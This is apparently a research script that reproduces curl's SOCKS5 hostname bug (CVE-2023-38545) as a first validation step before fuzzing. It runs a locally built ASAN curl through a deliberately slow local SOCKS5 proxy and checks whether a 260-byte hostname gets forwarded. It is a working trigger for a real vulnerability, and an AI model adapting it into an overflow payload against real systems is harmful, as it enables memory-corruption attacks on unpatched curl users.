#!/usr/bin/env python3
"""
Phase 1 Validation: Reproduce CVE-2023-38545 with the ASAN curl build.

CVE-2023-38545: SOCKS5 state-machine bug — hostname > 255 bytes forwarded to
proxy instead of rejected.

Root cause (lib/socks.c, Curl_SOCKS5):
  socks5_resolve_local is a LOCAL variable initialised on every function entry:

      bool socks5_resolve_local =
          (conn->socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE;

  With --socks5-hostname (CURLPROXY_SOCKS5_HOSTNAME) it starts FALSE.
  In the CONNECT_SOCKS_INIT state the code detects hostname > 255 and sets
  it to TRUE — but because the state machine is non-blocking and re-enters
  Curl_SOCKS5() for each I/O step, the variable resets to FALSE on re-entry.
  CONNECT_REQ_INIT then finds socks5_resolve_local==FALSE, takes the remote-
  resolve path, and sends the hostname to the proxy with a 1-byte truncated
  length prefix (260 & 0xFF == 4), which is a protocol-level error.

The actual memory overflow only manifests for hostnames approaching 16 KB
(the size of data->state.buffer = socksreq).  For a 260-byte hostname ASAN
will NOT crash; the observable proof of the bug is instead behavioural:

  VULNERABLE (8.3.0): curl sends the hostname to the proxy and logs
      "SOCKS5 connect to <host>:PORT (remotely resolved)"

  PATCHED   (8.4.0+): curl immediately returns CURLPX_LONG_HOSTNAME and
      logs "SOCKS5: the destination hostname is too long to be resolved
      remotely by the proxy."

Fix (commit fb4415d8ae):
  Replace the attempted mode-switch with an unconditional error return:
      return CURLPX_LONG_HOSTNAME;

What this script does:
  1. Starts a slow SOCKS5 proxy on localhost.  The artificial delay forces
     curl's non-blocking loop to re-enter Curl_SOCKS5(), which resets
     socks5_resolve_local and triggers the state confusion.
  2. Runs the ASAN curl build with --verbose and a 260-char hostname.
  3. Checks curl's verbose log for the "remotely resolved" line (bug present)
     vs. the "too long" error line (patched).
"""

import socket
import subprocess
import sys
import threading
import time
import os

ASAN_CURL = os.path.join(os.path.dirname(__file__), "build/curl-asan/bin/curl")
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 10800  # high port, no root needed


def socks5_server(server_sock: socket.socket) -> None:
    """
    Slow SOCKS5 server.  Each response is delayed 150 ms so curl's non-
    blocking I/O loop must return between states, causing socks5_resolve_local
    to be re-initialised to FALSE on every re-entry of Curl_SOCKS5().
    """
    try:
        server_sock.settimeout(5)
        conn, _ = server_sock.accept()
        with conn:
            conn.settimeout(3)
            # Read client greeting (VER NMETHODS METHODS)
            conn.recv(256)
            time.sleep(0.15)   # force curl to re-enter state machine
            # Method selection: no auth
            conn.sendall(b"\x05\x00")
            time.sleep(0.15)   # force re-entry again before CONNECT_REQ_INIT
            # Read CONNECT request (contains the forwarded hostname)
            req = conn.recv(65536)
            # Echo received hostname length so we can log it server-side
            # SOCKS5 domain-name CONNECT: byte[4]=0x03 (ATYP), byte[5]=length
            if len(req) >= 6 and req[3] == 0x03:
                declared_len = req[4]
                actual_payload = req[5:5 + declared_len]
                print(f"  [proxy] CONNECT received: declared hostname len={declared_len}, "
                      f"total request bytes={len(req)}")
            time.sleep(0.15)
            # Success response: VER REP RSV ATYP BND.ADDR BND.PORT
            conn.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            time.sleep(0.5)    # keep open so curl reads the response
    except Exception as e:
        print(f"  [proxy] exception: {e}")
    finally:
        server_sock.close()


def run_validation() -> None:
    if not os.path.isfile(ASAN_CURL):
        print(f"[!] ASAN curl not found at: {ASAN_CURL}")
        print("    Run ./build_asan.sh first.")
        sys.exit(1)

    print(f"[*] ASAN curl: {ASAN_CURL}")
    print(f"[*] Starting slow SOCKS5 proxy on {PROXY_HOST}:{PROXY_PORT}")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((PROXY_HOST, PROXY_PORT))
    srv.listen(1)

    t = threading.Thread(target=socks5_server, args=(srv,), daemon=True)
    t.start()

    # 260-char hostname — 5 bytes over the 255-byte SOCKS5 limit.
    # Enough to trigger the state-machine bug but not to overflow the 16 KB
    # socksreq buffer (data->state.buffer).
    long_hostname = "A" * 260
    target_url = f"http://{long_hostname}/"

    env = os.environ.copy()
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=0:symbolize=1"
    env["UBSAN_OPTIONS"] = "print_stacktrace=1"

    cmd = [
        ASAN_CURL,
        "--socks5-hostname", f"{PROXY_HOST}:{PROXY_PORT}",
        "--max-time", "5",
        "--verbose",           # needed to capture the "remotely resolved" line
        "--output", "/dev/null",
        target_url,
    ]

    print(f"[*] Running curl (verbose, 5 s timeout)...")
    result = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=15)
    t.join(timeout=3)

    combined = result.stdout + result.stderr
    print(f"\n--- verbose output ---")
    print(combined[:3000] or "(empty)")
    print(f"--- exit code: {result.returncode} ---\n")

    # Determine outcome based on verbose log lines, not exit code or ASAN crash.
    remotely_resolved  = "remotely resolved" in combined
    too_long_error     = "too long to be resolved remotely" in combined
    asan_crash         = "AddressSanitizer" in combined or "heap-buffer-overflow" in combined

    if asan_crash:
        print("[+] ASAN CRASH — actual heap overflow detected (very long hostname?).")
        print("    CVE-2023-38545 confirmed at memory level.")

    elif remotely_resolved:
        print("[+] VULNERABLE BEHAVIOUR CONFIRMED — CVE-2023-38545 present.")
        print("    curl sent the >255-byte hostname to the proxy instead of erroring.")
        print("    Proof: 'remotely resolved' in verbose output above.")
        print("    The state-machine bug is working as described:")
        print("      socks5_resolve_local reset to FALSE on re-entry → hostname forwarded.")
        print("    Note: no ASAN crash at 260 bytes (socksreq is 16 KB; crash needs ~16 KB hostname).")
        print()
        print("[+] Phase 1 VALIDATED. Build pipeline and CVE ground-truth confirmed.")
        print("    Next step: run ./run_afl.sh to start fuzzing.")

    elif too_long_error:
        print("[~] PATCHED behaviour — curl returned CURLPX_LONG_HOSTNAME immediately.")
        print("    This is the fixed (8.4.0+) response. Are you running the patched build?")

    else:
        print("[?] Neither expected log line found. Check proxy connectivity and verbose output.")
        print(f"    exit code {result.returncode}")


if __name__ == "__main__":
    run_validation()
